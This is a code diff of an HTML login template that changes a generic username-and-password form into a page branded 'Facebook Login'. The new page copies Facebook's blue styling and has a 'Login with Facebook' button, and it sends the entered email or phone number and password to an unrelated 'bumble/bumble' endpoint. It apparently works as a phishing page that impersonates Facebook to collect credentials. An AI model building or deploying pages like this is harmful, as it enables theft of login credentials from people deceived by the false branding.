@@ -1,14 +1,87 @@
 {% include 'navbar.html' %}
-<br>
-<div style=margin-left:10px>
-<h1>Enter the Username and Password</h1>
-<form action="bumble/bumble" method =POST>
-    <label for="username">Username</label>
-      <input type="text" name="username" required >
-    <br>
-     <label for="pwd">Password</label>
-      <input type="password" name="pwd" required  >
-    <br>
-      <input type="submit" value="Submit">
-</form>
+
+<div class="container mt-4">
+    <div class="row justify-content-center">
+        <div class="col-md-6">
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="text-center mb-0">Facebook Login</h2>
+                </div>
+                <div class="card-body">
+                    <form action="bumble/bumble" method="POST" class="needs-validation" novalidate>
+                        <div class="mb-3">
+                            <label for="username" class="form-label">Email or Phone Number</label>
+                            <input type="text" 
+                                   class="form-control" 
+                                   id="username" 
+                                   name="username" 
+                                   placeholder="Enter your email or phone number"
+                                   required>
+                            <div class="invalid-feedback">
+                                Please enter your email or phone number.
+                            </div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <label for="pwd" class="form-label">Password</label>
+                            <input type="password" 
+                                   class="form-control" 
+                                   id="pwd" 
+                                   name="pwd" 
+                                   minlength="8"
+                                   required>
+                            <div class="invalid-feedback">
+                                Password must be at least 8 characters long.
+                            </div>
+                        </div>
+
+                        <div class="d-grid gap-2">
+                            <button type="submit" class="btn btn-primary">Login with Facebook</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
 </div>
+
+<style>
+    .card {
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        border: none;
+        border-radius: 8px;
+    }
+    
+    .card-header {
+        background-color: #f8f9fa;
+        border-bottom: 1px solid #eee;
+        border-radius: 8px 8px 0 0 !important;
+    }
+    
+    .btn-primary {
+        background-color: #1877F2;
+        border-color: #1877F2;
+    }
+    
+    .btn-primary:hover {
+        background-color: #166FE5;
+        border-color: #166FE5;
+    }
+</style>
+
+<script>
+    // Form validation
+    (function () {
+        'use strict'
+        var forms = document.querySelectorAll('.needs-validation')
+        Array.prototype.slice.call(forms).forEach(function (form) {
+            form.addEventListener('submit', function (event) {
+                if (!form.checkValidity()) {
+                    event.preventDefault()
+                    event.stopPropagation()
+                }
+                form.classList.add('was-validated')
+            }, false)
+        })
+    })()
+</script>
